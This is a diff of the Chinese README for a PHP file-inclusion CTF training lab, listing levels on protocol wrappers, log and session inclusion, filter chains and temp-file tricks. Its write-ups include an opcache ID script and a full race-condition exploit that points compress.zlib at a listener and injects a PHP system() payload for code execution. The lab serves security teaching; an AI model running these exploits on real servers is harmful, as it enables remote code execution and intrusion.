@@ -1,76 +1,68 @@
-# PHPinclude-labs
-PHP文件包含类靶场，各类协议的讲解以及基于协议的LFI/RFI
+## PHPinclude-labs
 
+PHP文件包含类靶场，各类协议的讲解以及基于协议的LFI/RFI。
 
+> 碎碎念
+>
+> 这是PHP系列靶场，比较体系化的第二个，同上一个反序列化的靶场([PHPSerialize-labs](https://github.com/ProbiusOfficial/PHPSerialize-labs)),个人而言PHP其实已经是一个快退休的语言了，因为它在Web世界的占比越来越少，这一点我在备课相关课程和写这系列靶场的时候和朋友交流过，怀疑过有没有必要写这一系列的东西，我想安全研究更像是一种思想，它不针对任何一种语言，拿文件包含来说 —— 我们千方百计的从开发手册中挖掘各种各样的函数，去拼接各种各样的协议，到后面从语言甚至语言之外的中间件寻找各种各样的临时文件，这看起来应该不是针对这一种语言的...
+> 总之，希望这个靶场能够帮到你，哪怕一点点灵感——或许呢？
 
-## 2024/07/29 更新
+(个人观点)对于PHP文件包含的大致学习路径（即本仓库靶场题目顺序逻辑）：
 
-- Level 0: include_base 体验关
-- Level 1: file协议
-- Level 2: data协议_1
-- Level 3:  data协议_2
-- Level 4: http:// & https://_1
-- Level 5: http:// & https://_2
-- Level 6: php协议_简介
-- Level 7: php协议_php://input
-- Level 8: php协议_php://filter_过滤器&字符串过滤器
-- Level 9: php协议_php://filter_转换过滤器
+**文件包含相关函数(PHP手册 > 语言参考 > 流程控制)** - [require](https://www.php.net/manual/zh/function.require.php),[include](https://www.php.net/manual/zh/function.include.php),[require_once](https://www.php.net/manual/zh/function.require-once.php),[include_once](https://www.php.net/manual/zh/function.include-once.php)
 
-DockerFile 还有后续关卡根据后面课程情况更新（ 还在想怎么写后面的内容（）
+**PHP支持的协议和封装协议**:[wrappers](https://www.php.net/manual/zh/wrappers.php)
 
-## 2024/08/02 更新
+**PHP能使用的 URL 包装器（ wrapper）的文件系统函数**：[ref.filesystem](https://www.php.net/manual/zh/ref.filesystem.php)
 
-为所有关卡添加了独立的 Dockerfile
+**查找可利用的文件（可控可被包含）**：可控的文件上传，可控的日志，特性文件等。
 
-- Level 10: 文件系统函数简介 & 文件系统函数_file_get_contents()
-- Level 11: 文件系统函数_file_put_contents()
-- Level 11-:封装协议解析（选自P牛2016年的文章 Filter的妙用）
-- Level 11+:文件系统函数\_file_put_contents()_死亡绕过
-- Level 12: LFI&&RFI的本质
-- Level 13: LFI\_日志文件包含_Nginx
-- Level 14: LFI\_日志文件包含_Apache
-- Level 15: LFI_Session文件包含
-- Level 16: FilterChain:THE_END_OF_LFI
-- Level 17: FilterChain:file read from error-based oracle
+**一些基于PHP语言底层逻辑的Bypass手段**：require/include_once 缺陷，FilterChain ...
 
-## 2024/08/06 - 08 更新
+**其他特殊利用技巧**：opcache缓存，【compress.zlib生成临时文件；Nginx 在后端 Fastcgi 响应过大产生临时文件】（本质上属于**查找可利用的文件**），pearcmd.php ...
 
-修复了部分关卡的Dockerfile Error，修改部分关卡的源码以提高可读性。
-添加了不常见的一些 include 手段
+## 关卡信息
 
-- Level 18:require/include_once 缺陷：绕过以重复包含文件
-    Modified From: [WMCTF2020]Make PHP Great Again.
+关于关卡更新依据请阅读页尾更新日志。
 
-- Level 19:opcache缓存
-    Modified From: [湖湘杯2020] 题目名字不重要反正题挺简单的
-    OPcache会在特定的目录缓存编译后的PHP文件，以达到在你下次访问的时候直接调用缓存中的字节码以提高响应速度 —— 利用这一特性，如果我们复写缓存文件为恶意代码，那么下次调用的时候就会执行恶意代码。  
-    
-- 当然在文件包含的这个关卡，我们只是简要的利用他会生成 filename.type.bin 这一特性去读取文件。 
-  
-  
-    具体的细节师傅们可以自行了解，你也可以通过修改该靶场的文件来搭建复写类型的RCE漏洞。  
-    
-    [F12 - opcache导致的RCE复现 ](https://www.cnblogs.com/F12-blog/p/18001985)  
-    
-    [笑花大王 - php7的Opcache getshell](https://www.cnblogs.com/xhds/p/13239331.html)
-    
-- Level 20: pearcmd.php 
-    选自P牛2021年的文章中 0x06 pearcmd.php的巧妙利用 ：https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
+| 序号      | 内容要点                                            |
+| --------- | --------------------------------------------------- |
+| Level 0   | include_base 体验关                                 |
+| Level 1   | file协议                                            |
+| Level 2   | data协议_1                                          |
+| Level 3   | data协议_2                                          |
+| Level 4   | http:// & https://_1                                |
+| Level 5   | http:// & https://_2                                |
+| Level 6   | php协议_简介                                        |
+| Level 7   | php协议_php://input                                 |
+| Level 8   | php协议\_php://filter_过滤器&字符串过滤器           |
+| Level 9   | php协议\_php://filter_转换过滤器                    |
+| Level 10  | 文件系统函数简介 & 文件系统函数_file_get_contents() |
+| Level 11  | 文件系统函数_file_put_contents()                    |
+| Level 11- | 封装协议解析（选自P牛2016年的文章 Filter的妙用）    |
+| Level 11+ | 文件系统函数\_file_put_contents()_死亡绕过          |
+| Level 12  | LFI&&RFI的本质                                      |
+| Level 13  | LFI\_日志文件包含_Nginx                             |
+| Level 14  | LFI\_日志文件包含_Apache                            |
+| Level 15  | LFI_Session文件包含                                 |
+| Level 16  | FilterChain:THE_END_OF_LFI                          |
+| Level 17  | FilterChain:file read from error-based oracle       |
+| Level 18  | require/include_once 缺陷：绕过以重复包含文件       |
+| Level 19  | opcache缓存                                         |
+| Level 20  | pearcmd.php                                         |
+| Level 21  | compress.zlib生成临时文件                           |
+| Level 22  | Nginx 在后端 Fastcgi 响应过大产生临时文件           |
+| Level 23  | 伪协议读文件二次URL编码                             |
 
-- Level 21: compress.zlib生成临时文件
-    Modified form [hxp 36C3 CTF]includer
-    参考文章：https://zeddyu.github.io/2020/01/08/36c3-web/#includer
-    
-- Level 22: Nginx 在后端 Fastcgi 响应过大产生临时文件
-    Modified form [HXPCTF 2021]includer's revenge
-    参考文章：https://tttang.com/archive/1384/
+## 推荐资源
 
-- Level 23: 伪协议读文件二次URL编码
-    不多说 看关卡一目了然x
+[CTFShow - Web入门 - 文件包含部分（web78-web117）](https://ctf.show/challenges#)
 
-## 更新感言
-这是PHP系列靶场，比较体系化的第二个，同上一个反序列化的靶场([PHPSerialize-labs](https://github.com/ProbiusOfficial/PHPSerialize-labs)),个人而言PHP其实已经是一个快退休的语言了，因为它在Web世界的占比越来越少，这一点我在备课相关课程和写这系列靶场的时候和朋友交流过，怀疑过有没有必要写这一系列的东西，我想安全研究更像是一种思想，它不针对任何一种语言，拿文件包含来说 —— 我们千方百计的从开发手册中挖掘各种各样的函数，去拼接各种各样的协议，到后面从语言甚至语言之外的中间件寻找各种各样的临时文件，这看起来应该不是针对这一种语言的...
-总之，希望这个靶场能够帮到你，哪怕一点点灵感——或许呢？
+[Payloads All The Things-文件包含](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
+
+[Payloads All The Things-文件包含到RCE](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/)
+
+[Payloads All The Things-利用wrapper实现文件包含](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/)
 
 ## WriteUp
 
@@ -517,3 +509,263 @@ payload:
 运行拿到flag
 
 ![image-20240806112106652](./assets/level17.png)
+
+### Level 18:require/include_once 缺陷：绕过以重复包含文件
+Modified From: [WMCTF2020]Make PHP Great Again.
+
+参考WP可以直接看：[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)
+
+### Level 19:opcache缓存
+Modified From: [湖湘杯2020] 题目名字不重要反正题挺简单的
+
+OPcache会在特定的目录缓存编译后的PHP文件，以达到在你下次访问的时候直接调用缓存中的字节码以提高响应速度 —— 利用这一特性，如果我们复写缓存文件为恶意代码，那么下次调用的时候就会执行恶意代码。 
+
+当然在文件包含的这个关卡，我们只是简要的利用他会生成 filename.type.bin 这一特性去读取文件。 
+
+具体的细节师傅们可以自行了解，你也可以通过修改该靶场的文件来搭建复写类型的RCE漏洞。 
+
+[F12 - opcache导致的RCE复现 ](https://www.cnblogs.com/F12-blog/p/18001985) 
+
+[笑花大王 - php7的Opcache getshell](https://www.cnblogs.com/xhds/p/13239331.html)
+
+计算对应ID的脚本以附在靶场中:exp.py
+
+```python
+import sys
+import re
+import requests
+import hashlib
+from packaging import version  # pip install packaging
+
+url = 'http://core.hello-ctf.com:32882/'
+phpinfo_url = url + '/?file=phpinfo'
+
+text = requests.get(phpinfo_url).text
+print(text)
+php_version = re.search(r'<tr><td class="e">PHP Version </td><td class="v">(.*) </td></tr>', text)
+if php_version is None:
+    php_version = re.search(r'<h1 class="p">PHP Version (.*)', text)
+if php_version is None:
+    print("No PHP version found, is this a phpinfo file?")
+    sys.exit(0)
+php_version = php_version.group(1)
+php_greater_74 = (version.parse("7.4.0") < version.parse(php_version.split("-")[0]))
+zend_extension_id = re.search(r'<tr><td class="e">Zend Extension Build </td><td class="v">(.*) </td></tr>', text)
+if zend_extension_id is None:
+    print("No Zend Extension Build found.")
+    sys.exit(0)
+zend_extension_id = zend_extension_id.group(1)
+architecture = re.search(r'<tr><td class="e">System </td><td class="v">(.*) </td></tr>', text)
+if architecture is None:
+    print("No System info found.")
+    sys.exit(0)
+architecture = architecture.group(1).split()[-1]
+if architecture == "x86_64":
+    bin_id_suffix = "48888"
+else:
+    bin_id_suffix = "44444"
+if php_greater_74:
+    zend_bin_id = "BIN_" + bin_id_suffix
+else:
+    zend_bin_id = "BIN_SIZEOF_CHAR" + bin_id_suffix
+if not php_greater_74:
+    if architecture == "x86_64":
+        alt_bin_id_suffix = "148888"
+    else:
+        alt_bin_id_suffix = "144444"
+
+    alt_zend_bin_id = "BIN_" + alt_bin_id_suffix
+print("PHP version : " + php_version)
+print("Zend Extension ID : " + zend_extension_id)
+print("Zend Bin ID : " + zend_bin_id)
+print("Assuming " + architecture + " architecture")
+digest = hashlib.md5((php_version + zend_extension_id + zend_bin_id).encode()).hexdigest()
+print("------------")
+print("System ID : " + digest)
+if not php_greater_74:
+    alt_digest = hashlib.md5((php_version + zend_extension_id + alt_zend_bin_id).encode()).hexdigest()
+    print("PHP lower than 7.4 detected, an alternate Bin ID is possible:")
+    print("Alternate Zend Bin ID : " + alt_zend_bin_id)
+    print("Alternate System ID : " + alt_digest)
+print("------------")
+```
+
+该关卡配置:
+```bash
+allow_url_fopen=Off
+allow_url_include=Off
+opcache.enable=1
+opcache.validate_timestamps=0
+opcache.file_cache_only=1 
+opcache.file_cache=/var/www/html/opcache
+```
+
+相关文件：
+
+当前目录下 flag.php 文件，flag以静态变量形式存储在文件中。
+
+### Level 20: pearcmd.php 
+选自P牛2021年的文章中 0x06 pearcmd.php的巧妙利用 ：https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
+
+### Level 21: compress.zlib生成临时文件
+Modified form [hxp 36C3 CTF]includerLevel 21: compress.zlib生成临时文件
+
+详细可看陆师傅的WP：https://zeddyu.github.io/p/36c3-web-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#includer
+
+exp
+
+```python
+# from https://gist.github.com/ZeddYu/42159da911e82dba923b375a9f64ad65
+from pwn import *
+import requests
+import re
+import threading
+import time
+
+
+for gg in range(100):
+
+    r = remote("192.168.34.1", 8004)
+    l = listen(8080)
+    
+    data = '''name={}&file=compress.zlib://http://192.168.151.132:8080'''.format("a"*8050)
+
+    payload = '''POST / HTTP/1.1
+Host: 192.168.34.1:8004
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
+Content-Length: {}
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Cookie: PHPSESSID=asdasdasd
+Upgrade-Insecure-Requests: 1
+{}'''.format(len(data), data).replace("\n","\r\n")
+
+
+    r.send(payload)
+    try:
+        r.recvuntil('your sandbox: ')
+    except EOFError:
+        print("[ERROR]: EOFERROR")
+        # l.close()
+        r.close()
+        continue
+    # dirname = r.recv(70)
+    dirname = r.recvuntil('\n', drop=True) + '/'
+
+    print("[DEBUG]:" + dirname)
+
+    # send trash
+    c = l.wait_for_connection()
+    resp = '''HTTP/1.1 200 OK
+Date: Sun, 29 Dec 2019 05:22:47 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 534
+Content-Type: text/html; charset=UTF-8
+{}'''.format('A'* 5000000).replace("\n","\r\n")
+    c.send(resp)
+
+
+    # get filename
+    r2 = requests.get("http://192.168.34.1:8004/.well-known../"+ dirname + "/")
+    try:
+        tmpname = "php" + re.findall(">php(.*)<\/a",r2.text)[0]
+        print("[DEBUG]:" + tmpname)
+    except IndexError:
+        l.close()
+        r.close()
+        print("[ERROR]: IndexErorr")
+        continue
+    def job():
+        time.sleep(0.01)
+        phpcode = 'wtf<?php system("/readflag");?>';
+        c.send(phpcode)
+
+    t = threading.Thread(target = job)
+    t.start()
+
+    # file_get_contents and include tmp file
+    exp_file = dirname + "/" + tmpname
+    print("[DEBUG]:"+exp_file)
+    r3 = requests.post("http://192.168.34.1:8004/", data={'file':exp_file})
+    print(r3.status_code,r3.text)
+    if "wtf" in r3.text:
+        break
+
+    t.join()
+    r.close()
+    l.close()
+    #r.interactive()
+```
+
+### Level 22: Nginx 在后端 Fastcgi 响应过大产生临时文件
+Modified form [HXPCTF 2021]includer's revenge
+参考文章：https://tttang.com/archive/1384/
+
+### Level 23: 伪协议读文件二次URL编码
+不多说 看关卡一目了然x
+
+## 更新日志
+
+**2024/07/29 更新**
+
+- Level 0: include_base 体验关
+- Level 1: file协议
+- Level 2: data协议_1
+- Level 3:  data协议_2
+- Level 4: http:// & https://_1
+- Level 5: http:// & https://_2
+- Level 6: php协议_简介
+- Level 7: php协议_php://input
+- Level 8: php协议_php://filter_过滤器&字符串过滤器
+- Level 9: php协议_php://filter_转换过滤器
+
+**2024/08/02 更新**
+
+为所有关卡添加了独立的 Dockerfile
+
+- Level 10: 文件系统函数简介 & 文件系统函数_file_get_contents()
+- Level 11: 文件系统函数_file_put_contents()
+- Level 11-:封装协议解析（选自P牛2016年的文章 Filter的妙用）
+- Level 11+:文件系统函数\_file_put_contents()_死亡绕过
+- Level 12: LFI&&RFI的本质
+- Level 13: LFI\_日志文件包含_Nginx
+- Level 14: LFI\_日志文件包含_Apache
+- Level 15: LFI_Session文件包含
+- Level 16: FilterChain:THE_END_OF_LFI
+- Level 17: FilterChain:file read from error-based oracle
+
+**2024/08/06 - 08 更新**
+
+修复了部分关卡的Dockerfile Error，修改部分关卡的源码以提高可读性。
+添加了不常见的一些 include 手段
+
+- Level 18:require/include_once 缺陷：绕过以重复包含文件
+  Modified From: [WMCTF2020]Make PHP Great Again.
+
+- Level 19:opcache缓存
+  Modified From: [湖湘杯2020] 题目名字不重要反正题挺简单的
+  OPcache会在特定的目录缓存编译后的PHP文件，以达到在你下次访问的时候直接调用缓存中的字节码以提高响应速度 —— 利用这一特性，如果我们复写缓存文件为恶意代码，那么下次调用的时候就会执行恶意代码。  
+
+  当然在文件包含的这个关卡，我们只是简要的利用他会生成 filename.type.bin 这一特性去读取文件。 
+
+
+  具体的细节师傅们可以自行了解，你也可以通过修改该靶场的文件来搭建复写类型的RCE漏洞。  
+
+  [F12 - opcache导致的RCE复现 ](https://www.cnblogs.com/F12-blog/p/18001985)  
+
+  [笑花大王 - php7的Opcache getshell](https://www.cnblogs.com/xhds/p/13239331.html)
+
+- Level 20: pearcmd.php 
+  选自P牛2021年的文章中 0x06 pearcmd.php的巧妙利用 ：https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
+
+- Level 21: compress.zlib生成临时文件
+  Modified form [hxp 36C3 CTF]includer
+  参考文章：https://zeddyu.github.io/p/36c3-web-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/
+
+- Level 22: Nginx 在后端 Fastcgi 响应过大产生临时文件
+  Modified form [HXPCTF 2021]includer's revenge
+  参考文章：https://tttang.com/archive/1384/
+
+- Level 23: 伪协议读文件二次URL编码
+  
